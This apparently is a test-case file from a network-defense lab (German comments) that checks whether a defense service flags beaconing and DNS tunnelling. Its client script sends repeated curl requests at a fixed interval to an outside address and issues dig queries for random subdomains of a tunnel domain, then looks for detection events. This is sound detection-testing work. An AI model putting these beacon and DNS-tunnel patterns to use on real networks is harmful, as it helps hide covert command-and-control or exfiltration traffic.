ID=R06
TITLE="Abwehr: Fester Beacon + DNS-Tunnel-Muster -> Ereignisse beacon/dns_tunnel"
CONFIG=defense
# the defense's active DNS check (dns_probe = on in configs/defense.toml) asks these two fixed names
ALLOW=(dnsname:dns.google dnsname:one.one.one.one)
EXPECT_CANARY=none
NOTE="Client faehrt (inline, wie attacker/beacon.sh) (festes Intervall zu einer Adresse ausserhalb des
Tunnels) und (wie attacker/dnstunnel.sh) (lange, zufaellige Subdomains) selbst aus, um die
Eigenbeobachtung (nicht die Lab-Kanten) zu pruefen. Erwartet: Ereignisse kind=beacon und
kind=dns_tunnel in /v1/defense/events, Heat steigt. Beobachter beobachtet parallel am Gateway.
Nicht in der Lab-VM gelaufen (Stand 11.11.)."
during() {
	sleep 8
	gw attacker/observer.sh start || true
}
CLIENT="BEACON_DEST=${DEFENSE_BEACON_DEST:?set DEFENSE_BEACON_DEST in local.env} TUNNEL_DOMAIN=${DEFENSE_TUNNEL_DOMAIN:?set DEFENSE_TUNNEL_DOMAIN in local.env}"'
api() { curl -s --unix-socket /run/shunt/shuntd.sock "http://shunt$1"; }
# the attack runs inline: no files to copy (PREP runs in the client, where client_cp_to does not exist)
for i in 1 2 3 4 5 6; do curl -s -m 2 "http://$BEACON_DEST/" -o /dev/null || true; sleep 5; done
for i in $(seq 15); do
	l=$(head -c24 /dev/urandom | base32 | tr -d "=" | tr A-Z a-z)
	dig +short +time=2 +tries=1 "$l.$TUNNEL_DOMAIN" >/dev/null || true
done
sleep 15
st=$(api "/v1/defense/events?since=0")
echo "$st" | grep -q "\"kind\":\"beacon\"" || echo "FAIL kein Beacon-Ereignis"
echo "$st" | grep -q "\"kind\":\"dns_tunnel\"" || echo "FAIL kein DNS-Tunnel-Ereignis"
true
'
after() {
	gw attacker/observer.sh stop
}
